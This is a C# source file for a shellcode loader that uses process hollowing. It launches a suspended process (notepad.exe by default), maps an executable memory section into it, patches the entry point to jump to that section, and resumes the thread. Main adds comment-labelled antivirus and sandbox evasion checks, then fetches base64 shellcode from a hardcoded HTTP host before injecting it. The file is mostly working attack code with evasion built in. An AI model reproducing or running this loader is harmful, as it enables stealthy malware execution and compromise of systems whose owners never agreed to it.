using System;
using System.Collections.Generic;
using System.Net;
using System.Runtime.InteropServices;

namespace HollowInjection
{
    public class Program
    {
        #region ProcHollowing DLL Imports
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);

        [DllImport("Kernel32", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);
        #endregion PH DLL Imports

        #region bypass DLL Imports
        //bypass heuristics detection (checks for sandbox)
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        //bypass heuristics detection (trick AV with sleep)
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        #endregion bypass DLL Imports

        #region ProcHollowing Structs
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            uint cb;
            IntPtr lpReserved;
            IntPtr lpDesktop;
            IntPtr lpTitle;
            uint dwX;
            uint dwY;
            uint dwXSize;
            uint dwYSize;
            uint dwXCountChars;
            uint dwYCountChars;
            uint dwFillAttributes;
            public uint dwFlags;
            public ushort wShowWindow;
            ushort cbReserved;
            IntPtr lpReserved2;
            IntPtr hStdInput;
            IntPtr hStdOutput;
            IntPtr hStdErr;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_INFO
        {
            public uint dwOem;
            public uint dwPageSize;
            public IntPtr lpMinAppAddress;
            public IntPtr lpMaxAppAddress;
            public IntPtr dwActiveProcMask;
            public uint dwNumProcs;
            public uint dwProcType;
            public uint dwAllocGranularity;
            public ushort wProcLevel;
            public ushort wProcRevision;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct LARGE_INTEGER
        {
            public uint LowPart;
            public int HighPart;
        }
        #endregion End of PH Structs


        public class ProcessHollow
        {
            IntPtr section_;
            IntPtr localmap_;
            IntPtr remotemap_;
            IntPtr localsize_;
            IntPtr remotesize_;
            IntPtr pModBase_;
            IntPtr pEntry_;
            uint rvaEntryOffset_;
            uint size_;
            byte[] inner_;
            public const uint PageReadWriteExecute = 0x40;
            public const uint PageReadWrite = 0x04;
            public const uint PageExecuteRead = 0x20;
            public const uint MemCommit = 0x00001000;
            public const uint SecCommit = 0x08000000;
            public const uint GenericAll = 0x10000000;
            public const uint CreateSuspended = 0x00000004;
            public const uint DetachedProcess = 0x00000008;
            public const uint CreateNoWindow = 0x08000000;
            private const ulong PatchSize = 0x10;

            public uint round_to_page(uint size)
            {
                SYSTEM_INFO info = new SYSTEM_INFO();
                GetSystemInfo(ref info);
                return (info.dwPageSize - size % info.dwPageSize) + size;
            }
            const int AttributeSize = 24;

            private bool nt_success(long v)
            {
                return (v >= 0);
            }

            public IntPtr GetCurrent()
            {
                return GetCurrentProcess();
            }

            public static PROCESS_INFORMATION StartProcess(string pathToService)
            {
                uint flags = CreateSuspended;
                STARTUPINFO si = new STARTUPINFO();
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                CreateProcess((IntPtr)0, pathToService, (IntPtr)0, (IntPtr)0, false, flags, (IntPtr)0, (IntPtr)0, ref si, out pi);
                return pi;
            }


            public bool CreateSection(uint size)
            {
                LARGE_INTEGER liVal = new LARGE_INTEGER();
                size_ = round_to_page(size);
                liVal.LowPart = size_;

                long status = ZwCreateSection(ref section_, GenericAll, (IntPtr)0, ref liVal, PageReadWriteExecute, SecCommit, (IntPtr)0);
                return nt_success(status);
            }

            public KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, uint protect, IntPtr addr)
            {
                IntPtr baseAddr = addr;
                IntPtr viewSize = (IntPtr)size_;
                long status = ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);
                return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
            }

            public void SetLocalSection(uint size)
            {
                KeyValuePair<IntPtr, IntPtr> vals = MapSection(GetCurrent(), PageReadWriteExecute, IntPtr.Zero);
                localmap_ = vals.Key;
                localsize_ = vals.Value;
            }

            public void CopyShellcode(byte[] buf)
            {
                long lsize = size_;

                unsafe
                {
                    byte* p = (byte*)localmap_;
                    for (int i = 0; i < buf.Length; i++)
                    {
                        p[i] = buf[i];
                    }
                }
            }

            public KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
            {
                int i = 0;
                IntPtr ptr;
                ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);

                unsafe
                {
                    byte* p = (byte*)ptr;
                    byte[] tmp = null;

                    if (IntPtr.Size == 4)
                    {
                        p[i] = 0xb8;
                        i++;
                        Int32 val = (Int32)dest;
                        tmp = BitConverter.GetBytes(val);
                    }
                    else
                    {
                        p[i] = 0x48;
                        i++;
                        p[i] = 0xb8;
                        i++;

                        Int64 val = (Int64)dest;
                        tmp = BitConverter.GetBytes(val);
                    }

                    for (int j = 0; j < IntPtr.Size; j++)
                        p[i + j] = tmp[j];

                    i += IntPtr.Size;
                    p[i] = 0xff;
                    i++;
                    p[i] = 0xe0;
                    i++;
                }
                return new KeyValuePair<int, IntPtr>(i, ptr);
            }

            private IntPtr GetEntryFromBuffer(byte[] buf)
            {
                IntPtr res = IntPtr.Zero;
                unsafe
                {
                    fixed (byte* p = buf)
                    {
                        uint e_lfanew_offset = *((uint*)(p + 0x3c));
                        byte* nthdr = (p + e_lfanew_offset);
                        byte* opthdr = (nthdr + 0x18);
                        ushort t = *((ushort*)opthdr);
                        byte* entry_ptr = (opthdr + 0x10);
                        int tmp = *((int*)entry_ptr);
                        rvaEntryOffset_ = (uint)tmp;

                        if (IntPtr.Size == 4)
                            res = (IntPtr)(pModBase_.ToInt32() + tmp);
                        else
                            res = (IntPtr)(pModBase_.ToInt64() + tmp);
                    }
                }

                pEntry_ = res;
                return res;
            }

            public IntPtr FindEntry(IntPtr hProc)
            {
                PROCESS_BASIC_INFORMATION basicInfo = new PROCESS_BASIC_INFORMATION();
                uint tmp = 0;
                long success = ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);

                IntPtr readLoc = IntPtr.Zero;
                byte[] addrBuf = new byte[IntPtr.Size];
                if (IntPtr.Size == 4)
                {
                    readLoc = (IntPtr)((Int32)basicInfo.PebAddress + 8);
                }
                else
                {
                    readLoc = (IntPtr)((Int64)basicInfo.PebAddress + 16);
                }

                IntPtr nRead = IntPtr.Zero;
                ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead);

                if (IntPtr.Size == 4)
                    readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
                else
                    readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

                pModBase_ = readLoc;
                ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead);
                return GetEntryFromBuffer(inner_);
            }

            public void MapAndStart(PROCESS_INFORMATION pInfo)
            {
                KeyValuePair<IntPtr, IntPtr> tmp = MapSection(pInfo.hProcess, PageReadWriteExecute, IntPtr.Zero);

                remotemap_ = tmp.Key;
                remotesize_ = tmp.Value;

                KeyValuePair<int, IntPtr> patch = BuildEntryPatch(tmp.Key);
                try
                {
                    IntPtr pSize = (IntPtr)patch.Key;
                    IntPtr tPtr = new IntPtr();
                    WriteProcessMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, out tPtr);
                }
                finally
                {
                    if (patch.Value != IntPtr.Zero)
                        Marshal.FreeHGlobal(patch.Value);
                }

                byte[] tbuf = new byte[0x1000];
                IntPtr nRead = new IntPtr();
                ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead);

                uint res = ResumeThread(pInfo.hThread);
            }

            public void StartProcAndInjectCode(string binary, byte[] shellcode)
            {
                PROCESS_INFORMATION pinf = StartProcess(binary);
                CreateSection((uint)shellcode.Length);
                FindEntry(pinf.hProcess);
                SetLocalSection((uint)shellcode.Length);
                CopyShellcode(shellcode);
                MapAndStart(pinf);
                CloseHandle(pinf.hThread);
                CloseHandle(pinf.hProcess);
            }

            public ProcessHollow()
            {
                section_ = new IntPtr();
                localmap_ = new IntPtr();
                remotemap_ = new IntPtr();
                localsize_ = new IntPtr();
                remotesize_ = new IntPtr();
                inner_ = new byte[0x1000];
            }
        }



        public static string GetCode(string url)
        {
            WebClient client = new WebClient();
            client.Proxy = WebRequest.GetSystemWebProxy();
            client.Proxy.Credentials = CredentialCache.DefaultCredentials;
            string shellcode = client.DownloadString(url);

            return shellcode;
        }


        public static void Main(string[] args)
        {
            try
            {

                //bypass heuristics detection (trick AV with sleep)
                DateTime tm = DateTime.Now;
                Sleep(2000);
                double tmCheck = DateTime.Now.Subtract(tm).TotalSeconds;
                if (tmCheck < 1.5)
                {
                    return;
                }

                //bypass heuristics detection (check for sandbox)
                IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
                if (mem == null)
                {
                    return;
                }

                //Any given arguments are added to the dictionary
                var arguments = new Dictionary<string, string>();
                foreach (var argument in args)
                {
                    var idx = argument.IndexOf(':');
                    if (idx > 0)
                        arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                    else
                        arguments[argument] = string.Empty;
                }

                // STEP 1: PAYLOAD
                // Add a base64 encoded shellcode string were the placeholder is
                // OR hardcode the URL to remotely download the base64 encoded shellcode in memory
                string shellcode = "";
                string urlToSC = @"http://10.111.10.5/sharp.b64";

                shellcode = GetCode(urlToSC); //if NOT downloading the shellcode, command this line out. 

                byte[] buf = new byte[] { };
                buf = Convert.FromBase64String(shellcode);

                // STEP 2: SELECT PROGRAM
                // Hardcode the path to the program that is started and used to inject the shellcode into
                // OR specify the path as an argument during execution: /program:C:\<path to program.exe>
                string pathToService = @"C:\Windows\System32\notepad.exe";
                if (arguments.ContainsKey("/program"))
                {
                    pathToService = arguments["/program"];
                }

                ProcessHollow ProcessHollow = new ProcessHollow();
                ProcessHollow.StartProcAndInjectCode(pathToService, buf);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }
}
